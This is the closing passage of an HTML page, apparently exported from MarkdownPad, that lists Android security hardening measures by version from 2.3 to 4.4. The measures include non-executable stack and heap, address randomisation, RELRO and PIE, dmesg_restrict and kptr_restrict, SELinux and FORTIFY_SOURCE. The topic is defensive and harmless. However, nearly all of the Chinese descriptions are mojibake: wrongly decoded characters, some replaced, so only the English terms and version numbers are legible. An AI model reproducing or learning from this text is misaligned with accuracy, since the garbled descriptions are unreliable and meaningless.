</li><li>2.3<ul>
<li>浜岃繘鍒舵枃浠剁紪璇戞椂鍚敤涓嶅彲鎵ц鐨勬爤鍜屽爢鏈哄埗</li><li>瀹樻柟鏂囨。绉板姞鍏ヤ簡mmap_min_addr</li><li>浜岃繘鍒舵枃浠剁紪璇戞椂浣跨敤-Wformat-security -Werror=format-security</li></ul>
</li><li>4.0<ul>
<li>闅忔満鍖栨爤鍦板潃</li><li>闅忔満鍖杕map(搴撴枃浠讹紝鍖垮悕鏄犲皠)鐨勫湴鍧€</li></ul>
</li><li>4.0.2<ul>
<li>闅忔満鍖栧爢鍦板潃</li></ul>
</li><li>4.0.4<ul>
<li>chown锛宑hmod鍜宮kdir鏀逛负浣跨敤NOFOLLOW鏍囧織</li></ul>
</li><li>4.1<ul>
<li>灏唘mask榛樿鍊兼敼涓�0077</li><li>闄愬埗READ_LOGS</li><li>闅忔満鍖杔inker鐨勬鍦板潃</li><li>浜岃繘鍒舵枃浠剁紪璇戞椂浣跨敤RELRO鍜孊IND_NOW</li><li>浜岃繘鍒舵枃浠剁紪璇戞椂浣跨敤PIE</li><li>鍚敤dmesg_restrict鍜宬ptr_restrict</li><li>寮曞叆闅旂鐨凷ervice</li></ul>
</li><li>4.1.1<ul>
<li>灏唌map_min_addr鐨勫€煎鑷�32768</li></ul>
</li><li>4.2<ul>
<li>Content Provider榛樿涓嶅啀鏆撮湶</li><li>涓篠ecureRandom寮曞叆鏇村鐨勭瀛愪娇鍏舵棤娉曢娴�</li><li>寮€濮嬩娇鐢‵ORTIFY_SOURCE=1</li></ul>
</li><li>4.2.2<ul>
<li>榛樿鍚敤ro.adb.secure</li></ul>
</li><li>4.3<ul>
<li>鍔犲叆SELinux骞跺惎鐢╬ermissive妯″紡</li><li>绉婚櫎鎵€鏈変娇鐢ㄤ簡setuid鍜宻etgid鐨勭▼搴�</li><li>闃绘搴旂敤鎵цset-uid绋嬪簭</li><li>瀹炵幇鍦▃ygote鍜宎dbd涓噺灏慙inux鑳藉姏</li></ul>
</li><li>4.4<ul>
<li>SELinux鍚敤enforcing妯″紡</li><li>寮€濮嬩娇鐢‵ORTIFY_SOURCE=2</li></ul>
</li></ul>

</body>
</html>
<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
